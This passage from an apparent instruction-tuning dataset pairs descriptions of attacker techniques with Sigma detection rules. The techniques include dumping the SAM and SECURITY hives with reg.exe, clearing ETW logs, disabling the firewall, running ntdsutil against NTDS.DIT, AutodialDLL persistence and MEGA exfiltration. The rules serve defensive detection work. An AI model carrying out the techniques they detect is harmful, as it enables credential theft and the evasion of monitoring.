    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'User restricted from sending email'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'User restricted from sending email'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email.",
      "answer": "In order to detect when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email, you should monitor logs from the threat management service, specifically targeting the Microsoft 365 platform. Focus on identifying events where the SecurityComplianceCenter is the event source. Specifically, look for the event named 'User restricted from sending email' with a status marked as success. This indicates a successful action where a user has been restricted due to exceeding sending limits, aligning with security compliance policies. Be aware that it might be challenging to distinguish between genuine policy violations and benign activities that trigger similar alerts, as there could be unknown factors leading to false positives. The severity of this activity is considered medium, suggesting it requires attention to mitigate potential security or compliance issues."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS queries for subdomains used for upload to MEGA.io.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring DNS query logs within Windows environments. Specifically, scrutinize DNS queries for occurrences that include 'userstorage.mega.co.nz' in the query name. This activity can be indicative of uploads to the cloud storage service MEGA, which might be used by attackers to exfiltrate data. While performing this detection, be aware that there might be false positives including legitimate DNS requests to MEGA, especially if the service is used for business or personal file storage purposes. The threat level for this type of detection is considered high, suggesting that occurrences should be prioritized in your security monitoring efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection:\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection:\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
      "question": "DNS queries for subdomains used for upload to MEGA.io",
      "answer": "In order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring DNS query logs within Windows environments. Specifically, scrutinize DNS queries for occurrences that include 'userstorage.mega.co.nz' in the query name. This activity can be indicative of uploads to the cloud storage service MEGA, which might be used by attackers to exfiltrate data. While performing this detection, be aware that there might be false positives including legitimate DNS requests to MEGA, especially if the service is used for business or personal file storage purposes. The threat level for this type of detection is considered high, suggesting that occurrences should be prioritized in your security monitoring efforts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting command that clears or disables any ETW trace log which could indicate a logging evasion..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a command that clears or disables any ETW (Event Tracing for Windows) trace log which could indicate a logging evasion, you should monitor for certain command line activities on Windows systems, specifically within the process creation logs. Look for commands issued to the system that include combinations of strings suggesting the clearing or disabling of ETW tracing. These commands are critical to identify because they can represent efforts by malicious actors to evade logging and monitoring mechanisms, thereby hiding their activities.\n\nFirstly, observe for the command line inclinations which aim to clear ETW logs. These inclinations are marked by the presence of 'cl' and '/Trace' or 'clear-log' and '/Trace' within a single command line execution. The intention here is to clear or reset the state of ETW logging, potentially erasing evidence of malicious activity.\n\nIn addition, pay attention to commands designed to disable ETW tracing. These are identified by the presence of strings like 'sl' and '/e:false', 'set-log' and '/e:false', or a combination of 'logman', 'update', 'trace', '--p', and '-ets'. These commands are usually structured to change the state or properties of ETW logging to disable or stop logging.\n\nFurthermore, specifically for PowerShell commands, look for 'Remove-EtwTraceProvider', indicating removal of an ETW provider, and 'Set-EtwTraceProvider' alongside '0x11', which suggests modification of a provider\u2019s \"Enable\" property to likely disable it.\n\nBeing vigilant for these commands is imperative as they can have a high impact on security monitoring mechanisms by evading detection. The lack of ETW logs might provide an attacker with a blind spot to conduct their activities unnoticed. Such actions are usually not part of regular system administration tasks and thus, while false positives are a possibility, they are unknown under normal circumstances.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine|contains|all:\n            - 'cl'\n            - '/Trace'\n    selection_clear_2:\n        CommandLine|contains|all:\n            - 'clear-log'\n            - '/Trace'\n    selection_disable_1:\n        CommandLine|contains|all:\n            - 'sl'\n            - '/e:false'\n    selection_disable_2:\n        CommandLine|contains|all:\n            - 'set-log'\n            - '/e:false'\n    selection_disable_3:   #ETW provider removal from a trace session\n        CommandLine|contains|all:\n            - 'logman'\n            - 'update'\n            - 'trace'\n            - '--p'\n            - '-ets'\n    selection_pwsh_remove:   #Autologger provider removal\n        CommandLine|contains: 'Remove-EtwTraceProvider'\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        CommandLine|contains|all:\n            - 'Set-EtwTraceProvider'\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine|contains|all:\n            - 'cl'\n            - '/Trace'\n    selection_clear_2:\n        CommandLine|contains|all:\n            - 'clear-log'\n            - '/Trace'\n    selection_disable_1:\n        CommandLine|contains|all:\n            - 'sl'\n            - '/e:false'\n    selection_disable_2:\n        CommandLine|contains|all:\n            - 'set-log'\n            - '/e:false'\n    selection_disable_3:   #ETW provider removal from a trace session\n        CommandLine|contains|all:\n            - 'logman'\n            - 'update'\n            - 'trace'\n            - '--p'\n            - '-ets'\n    selection_pwsh_remove:   #Autologger provider removal\n        CommandLine|contains: 'Remove-EtwTraceProvider'\n    selection_pwsh_set:   #Provider \u201cEnable\u201d property modification\n        CommandLine|contains|all:\n            - 'Set-EtwTraceProvider'\n            - '0x11'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "command that clears or disables any ETW trace log which could indicate a logging evasion.",
      "answer": "In order to detect a command that clears or disables any ETW (Event Tracing for Windows) trace log which could indicate a logging evasion, you should monitor for certain command line activities on Windows systems, specifically within the process creation logs. Look for commands issued to the system that include combinations of strings suggesting the clearing or disabling of ETW tracing. These commands are critical to identify because they can represent efforts by malicious actors to evade logging and monitoring mechanisms, thereby hiding their activities.\n\nFirstly, observe for the command line inclinations which aim to clear ETW logs. These inclinations are marked by the presence of 'cl' and '/Trace' or 'clear-log' and '/Trace' within a single command line execution. The intention here is to clear or reset the state of ETW logging, potentially erasing evidence of malicious activity.\n\nIn addition, pay attention to commands designed to disable ETW tracing. These are identified by the presence of strings like 'sl' and '/e:false', 'set-log' and '/e:false', or a combination of 'logman', 'update', 'trace', '--p', and '-ets'. These commands are usually structured to change the state or properties of ETW logging to disable or stop logging.\n\nFurthermore, specifically for PowerShell commands, look for 'Remove-EtwTraceProvider', indicating removal of an ETW provider, and 'Set-EtwTraceProvider' alongside '0x11', which suggests modification of a provider\u2019s \"Enable\" property to likely disable it.\n\nBeing vigilant for these commands is imperative as they can have a high impact on security monitoring mechanisms by evading detection. The lack of ETW logs might provide an attacker with a blind spot to conduct their activities unnoticed. Such actions are usually not part of regular system administration tasks and thus, while false positives are a possibility, they are unknown under normal circumstances.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM and SECURITY.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM, and SECURITY, you should look for processes being created on Windows systems where the process image ends with '\\reg.exe' or the original file name is identified as 'reg.exe'. This focuses on detecting commands that involve saving or exporting information, specifically when these commands contain flags like 'save', 'export', or variations thereof that may attempt to evade detection by slightly altering the characters. Furthermore, attention is paid to commands targeting critical registry hive keys such as HKLM (HKEY_LOCAL_MACHINE) or any obfuscated variations of this term. The detection extends to specifics about which registry hives are being targeted for dumping, including SYSTEM, SAM, and SECURITY, along with any attempts to obfuscate these terms within the command line. It's also important to consider that there could be legitimate reasons for such activities, including backups or forensic investigations, which might be considered as false positives in such detection efforts. The detection level for these activities is set to high due to their potential impact on system security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli_flag:\n        CommandLine|contains:\n            - 'save'\n            - 'export'\n            - '\u02e2ave'\n            - 'e\u02e3port'\n    selection_cli_hklm:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hk\u02eam'\n            - 'hkey_local_machine'\n            - 'hkey_\u02eaocal_machine'\n            - 'hkey_loca\u02ea_machine'\n            - 'hkey_\u02eaoca\u02ea_machine'\n    selection_cli_hive:\n        CommandLine|contains:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n            - '\\\u02e2ystem'\n            - '\\sy\u02e2tem'\n            - '\\\u02e2y\u02e2tem'\n            - '\\\u02e2am'\n            - '\\\u02e2ecurity'\n    condition: all of selection_*\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli_flag:\n        CommandLine|contains:\n            - 'save'\n            - 'export'\n            - '\u02e2ave'\n            - 'e\u02e3port'\n    selection_cli_hklm:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hk\u02eam'\n            - 'hkey_local_machine'\n            - 'hkey_\u02eaocal_machine'\n            - 'hkey_loca\u02ea_machine'\n            - 'hkey_\u02eaoca\u02ea_machine'\n    selection_cli_hive:\n        CommandLine|contains:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n            - '\\\u02e2ystem'\n            - '\\sy\u02e2tem'\n            - '\\\u02e2y\u02e2tem'\n            - '\\\u02e2am'\n            - '\\\u02e2ecurity'\n    condition: all of selection_*\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high\n",
      "question": "usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM and SECURITY",
      "answer": "In order to detect the usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM, and SECURITY, you should look for processes being created on Windows systems where the process image ends with '\\reg.exe' or the original file name is identified as 'reg.exe'. This focuses on detecting commands that involve saving or exporting information, specifically when these commands contain flags like 'save', 'export', or variations thereof that may attempt to evade detection by slightly altering the characters. Furthermore, attention is paid to commands targeting critical registry hive keys such as HKLM (HKEY_LOCAL_MACHINE) or any obfuscated variations of this term. The detection extends to specifics about which registry hives are being targeted for dumping, including SYSTEM, SAM, and SECURITY, along with any attempts to obfuscate these terms within the command line. It's also important to consider that there could be legitimate reasons for such activities, including backups or forensic investigations, which might be considered as false positives in such detection efforts. The detection level for these activities is set to high due to their potential impact on system security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect set EnableFirewall to 0 to disable the Windows firewall.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect set EnableFirewall to 0 to disable the Windows firewall, you should: Monitor Windows registry settings specifically within the registry category to identify changes targeting firewall configurations. Key attention should be paid to events where the EventType is \u2018SetValue\u2019 indicating a modification to the registry value. Focus on changes made to \u2018TargetObject\u2019 paths ending with \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall and \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall. These particular paths correspond to the settings controlling the Windows Firewall in both the Standard and Domain profiles. The critical detail to look for is if the value is set to 'DWORD (0x00000000)', which effectively disables the firewall. This action is a part of tactics often used to weaken a system's defenses, making it more susceptible to attacks by circumventing the firewall protection. It's important to note that some changes might be legitimate and marked as false positives, which means any detection should be investigated to confirm if it's a genuine threat or a benign action. The severity of this activity is considered medium, highlighting the potential risk while acknowledging that context is critical for accurate assessment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith:\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith:\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect set EnableFirewall to 0 to disable the Windows firewall",
      "answer": "In order to detect set EnableFirewall to 0 to disable the Windows firewall, you should: Monitor Windows registry settings specifically within the registry category to identify changes targeting firewall configurations. Key attention should be paid to events where the EventType is \u2018SetValue\u2019 indicating a modification to the registry value. Focus on changes made to \u2018TargetObject\u2019 paths ending with \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall and \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall. These particular paths correspond to the settings controlling the Windows Firewall in both the Standard and Domain profiles. The critical detail to look for is if the value is set to 'DWORD (0x00000000)', which effectively disables the firewall. This action is a part of tactics often used to weaken a system's defenses, making it more susceptible to attacks by circumventing the firewall protection. It's important to note that some changes might be legitimate and marked as false positives, which means any detection should be investigated to confirm if it's a genuine threat or a benign action. The severity of this activity is considered medium, highlighting the potential risk while acknowledging that context is critical for accurate assessment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility, you should: Monitor process creation logs on macOS for instances where the PlistBuddy utility is being used. Specifically, look for cases where the process's image path ends with '/PlistBuddy'. Additionally, check if the command line includes 'RunAtLoad' and 'true', indicating an attempt to set a process to run at login. Also, look for mentions of 'LaunchAgents' or 'LaunchDaemons' within the command line, as these are common methods for establishing persistence. Be aware that while this activity can be indicative of malicious behavior, there might be legitimate uses, thus unknown false positives could occur. The importance of this activity is considered high due to its potential association with persistence mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        Image|endswith: '/PlistBuddy'\n        CommandLine|contains|all:\n            - 'RunAtLoad'\n            - 'true'\n        CommandLine|contains:\n            - 'LaunchAgents'\n            - 'LaunchDaemons'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection:\n        Image|endswith: '/PlistBuddy'\n        CommandLine|contains|all:\n            - 'RunAtLoad'\n            - 'true'\n        CommandLine|contains:\n            - 'LaunchAgents'\n            - 'LaunchDaemons'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility",
      "answer": "In order to detect potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility, you should: Monitor process creation logs on macOS for instances where the PlistBuddy utility is being used. Specifically, look for cases where the process's image path ends with '/PlistBuddy'. Additionally, check if the command line includes 'RunAtLoad' and 'true', indicating an attempt to set a process to run at login. Also, look for mentions of 'LaunchAgents' or 'LaunchDaemons' within the command line, as these are common methods for establishing persistence. Be aware that while this activity can be indicative of malicious behavior, there might be legitimate uses, thus unknown false positives could occur. The importance of this activity is considered high due to its potential association with persistence mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows command line executable started from MMC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a Windows command line executable started from MMC, you should monitor process creation events on Windows operating systems. Specifically, you should look for instances where a command line utility such as Cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Script Host (wscript.exe or cscript.exe), shell scripts (sh.exe or bash.exe), registry command line tools (reg.exe or regsvr32.exe), or any process containing 'BITSADMIN' in its name is launched as a child process of the Microsoft Management Console (mmc.exe). Keep an eye on the command line parameters and image paths of these processes for any suspicious activity. Given the potential severity associated with this behavior, such events should be treated with a high level of concern. This approach helps in identifying misuse of administrative tools and command line utilities, which can be indicative of various types of attacks including those involving privilege escalation, lateral movement, and persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentImage|endswith: '\\mmc.exe'\n    selection2:\n        - Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n        - Image|contains: '\\BITSADMIN'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - Image\n    - ParentCommandLine\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentImage|endswith: '\\mmc.exe'\n    selection2:\n        - Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n        - Image|contains: '\\BITSADMIN'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - Image\n    - ParentCommandLine\nlevel: high\n",
      "question": "Windows command line executable started from MMC",
      "answer": "In order to detect a Windows command line executable started from MMC, you should monitor process creation events on Windows operating systems. Specifically, you should look for instances where a command line utility such as Cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Script Host (wscript.exe or cscript.exe), shell scripts (sh.exe or bash.exe), registry command line tools (reg.exe or regsvr32.exe), or any process containing 'BITSADMIN' in its name is launched as a child process of the Microsoft Management Console (mmc.exe). Keep an eye on the command line parameters and image paths of these processes for any suspicious activity. Given the potential severity associated with this behavior, such events should be treated with a high level of concern. This approach helps in identifying misuse of administrative tools and command line utilities, which can be indicative of various types of attacks including those involving privilege escalation, lateral movement, and persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of legitimate desktop support and remote access software by adversaries as a method to establish an interactive command and control channel within networks, you should focus on monitoring file events on Windows systems. Specifically, vigilance should be directed towards the creation or modification of configuration files associated with AnyDesk\u2014a popular remote desktop software. These configuration files typically include 'user.conf' and 'system.conf' located in the '\\AppData\\Roaming\\AnyDesk' directory. Additionally, attention should be paid to files ending with the '.temp' extension as they may also indicate suspicious activities related to the misuse of legitimate remote access software. It's important to note that these indicators can occasionally be triggered by legitimate use of AnyDesk or during normal system operations, hence it is classified at a medium level of alertness. The tactics and techniques primarily involved in such activities include Execution, Persistence, Privilege Escalation, and Defense Evasion, commonly seen with remote access tools like VNC, Ammyy, and Teamviewer which are employed by adversaries for command and control operations as part of their attack strategies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains:\n            - '\\AppData\\Roaming\\AnyDesk\\user.conf'\n            - '\\AppData\\Roaming\\AnyDesk\\system.conf'\n        TargetFilename|endswith: '.temp'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains:\n            - '\\AppData\\Roaming\\AnyDesk\\user.conf'\n            - '\\AppData\\Roaming\\AnyDesk\\system.conf'\n        TargetFilename|endswith: '.temp'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "answer": "In order to detect the use of legitimate desktop support and remote access software by adversaries as a method to establish an interactive command and control channel within networks, you should focus on monitoring file events on Windows systems. Specifically, vigilance should be directed towards the creation or modification of configuration files associated with AnyDesk\u2014a popular remote desktop software. These configuration files typically include 'user.conf' and 'system.conf' located in the '\\AppData\\Roaming\\AnyDesk' directory. Additionally, attention should be paid to files ending with the '.temp' extension as they may also indicate suspicious activities related to the misuse of legitimate remote access software. It's important to note that these indicators can occasionally be triggered by legitimate use of AnyDesk or during normal system operations, hence it is classified at a medium level of alertness. The tactics and techniques primarily involved in such activities include Execution, Persistence, Privilege Escalation, and Defense Evasion, commonly seen with remote access tools like VNC, Ammyy, and Teamviewer which are employed by adversaries for command and control operations as part of their attack strategies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT), you should: monitor the creation of processes within Windows environments, specifically focusing on the identification of instances where the process image name ends with '\\ntdsutil.exe'. This approach is targeted to uncover potential malicious activities involving the manipulation or attack on the NTDS database, which contains sensitive information. It is important to note that legitimate NTDS maintenance activities may also trigger this detection, so those should be considered as potential false positives. This monitoring carries a medium level of importance due to the potential for misuse of ntdsutil.exe in various attack scenarios.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium\n",
      "question": "execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)",
      "answer": "In order to detect execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT), you should: monitor the creation of processes within Windows environments, specifically focusing on the identification of instances where the process image name ends with '\\ntdsutil.exe'. This approach is targeted to uncover potential malicious activities involving the manipulation or attack on the NTDS database, which contains sensitive information. It is important to note that legitimate NTDS maintenance activities may also trigger this detection, so those should be considered as potential false positives. This monitoring carries a medium level of importance due to the potential for misuse of ntdsutil.exe in various attack scenarios."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting change the the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library, you should: Focus on monitoring registry set actions within Windows environments, specifically looking at event types that involve the setting of a value. The main event to look out for is when the value of \"AutodialDLL\" located within the \"\\Services\\WinSock2\\Parameters\" registry path is modified. This specific action is indicative of attempts to establish persistence on a system by loading a custom DLL through the \"ws2_32\" library, which is a legitimate library commonly used for network-related functions. Such modifications are rarely benign in nature and are therefore considered highly suspicious, with very limited scenarios under which they would be considered false positives. Essentially, detecting changes to this registry key can help identify and thwart attempts to maintain unauthorized access or control over a system through custom payloads leveraging the networking functionalities of Windows.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Services\\WinSock2\\Parameters\\AutodialDLL'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Services\\WinSock2\\Parameters\\AutodialDLL'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "change the the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library",
      "answer": "In order to detect changes to the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library, you should: Focus on monitoring registry set actions within Windows environments, specifically looking at event types that involve the setting of a value. The main event to look out for is when the value of \"AutodialDLL\" located within the \"\\Services\\WinSock2\\Parameters\" registry path is modified. This specific action is indicative of attempts to establish persistence on a system by loading a custom DLL through the \"ws2_32\" library, which is a legitimate library commonly used for network-related functions. Such modifications are rarely benign in nature and are therefore considered highly suspicious, with very limited scenarios under which they would be considered false positives. Essentially, detecting changes to this registry key can help identify and thwart attempts to maintain unauthorized access or control over a system through custom payloads leveraging the networking functionalities of Windows."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting discovery of domain trusts..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a discovery of domain trusts, you should: Monitor the creation of processes on Windows systems for executions of 'dsquery.exe' or 'nltest.exe' with specific command-line arguments indicating a search for domain trusts. Specifically, look for 'dsquery.exe' processes that include both '-filter' and 'trustedDomain' in the command line. Additionally, watch for 'nltest.exe' processes that include 'domain_trusts' in their command lines. It is important to note that while these behaviors can indicate an attacker's intent to discover domain trusts, they may also be part of legitimate system administration activities. Therefore, it's classified with a medium level of caution due to possible false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains|all:\n            - '-filter'\n            - 'trustedDomain'\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n    condition: selection\nfalsepositives:\n    - Administration of systems.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains|all:\n            - '-filter'\n            - 'trustedDomain'\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n    condition: selection\nfalsepositives:\n    - Administration of systems.\nlevel: medium\n",
      "question": "discovery of domain trusts.",
      "answer": "In order to detect a discovery of domain trusts, you should: Monitor the creation of processes on Windows systems for executions of 'dsquery.exe' or 'nltest.exe' with specific command-line arguments indicating a search for domain trusts. Specifically, look for 'dsquery.exe' processes that include both '-filter' and 'trustedDomain' in the command line. Additionally, watch for 'nltest.exe' processes that include 'domain_trusts' in their command lines. It is important to note that while these behaviors can indicate an attacker's intent to discover domain trusts, they may also be part of legitimate system administration activities. Therefore, it's classified with a medium level of caution due to possible false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet, you should focus on monitoring process creation events within Windows environments. Specifically, look for the execution of commands that attempt to change the lockscreen URL without specifying typical image file extensions like '.jpg', '.jpeg', or '.png'. This activity might indicate an attempt to misuse the functionality for downloading potentially malicious content from the Internet. Additionally, be on the alert for operations that involve deleting registry entries related to 'PersonalizationCSP', as this could be an attempt to remove traces of the lockscreen customization, thus further indicating suspicious behavior. Pay close attention to both the command line and parent command line fields for evidence of such activity. However, be mindful that there could be legitimate uses of these commands depending on the scripts and administrative tools employed within your IT environment, which means there might be instances that these detections are false positives. The importance of these detections is considered high due to the potential misuse of Windows features for malicious purposes.",
    "context": "",
